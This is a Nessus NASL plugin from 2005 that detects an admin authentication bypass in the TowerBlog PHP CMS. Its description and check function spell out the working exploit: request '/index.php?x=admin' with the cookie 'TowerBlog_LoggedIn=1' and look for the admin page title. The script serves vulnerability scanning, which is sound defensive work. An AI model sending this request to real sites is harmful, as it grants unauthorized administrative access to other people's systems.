#
# Script by Noam Rathaus GPLv2
#
# Noam Rathaus <noamr@beyondsecurity.com>
# link: http://www.securiteam.com/unixfocus/5VP0G0KFFK.html

if(description)
{
 script_id(18015);
 script_version("$Revision: 1.1 $");
 script_bugtraq_id(13090);

 name["english"] = "TowerBlog Admin Bypass";

 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running TowerBlog, a single-user content management
system, written in PHP.

Due to design error, an attacker may be granted administrative privileges
by requesting the page '/?x=admin' while setting a cookie whose value
is 'TowerBlog_LoggedIn=1'.

See also : http://www.securiteam.com/unixfocus/5VP0G0KFFK.html
Solution : Disable this software
Risk factor: Medium";

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of a TowerBlog Admin Bypassing";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2005 Noam Rathaus");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

debug = 0;

cookie = "TowerBlog_LoggedIn=1";

function check(loc)
{
 req = string("GET ", loc, "/index.php?x=admin", session, " HTTP/1.1\r\n",
              "Host: ", get_host_name(), ":", port, "\r\n",
              "Cookie: ", cookie, "\r\n",
	          "\r\n");
 r = http_keepalive_send_recv(port:port, data:req);
 if( r == NULL )exit(0);
 if('<title>TowerBlog &gt;&gt; admin</title>' >< r)
 {
  security_warning(port);
  exit(0);
 }
}


foreach dir ( cgi_dirs() ) check(loc:dir);
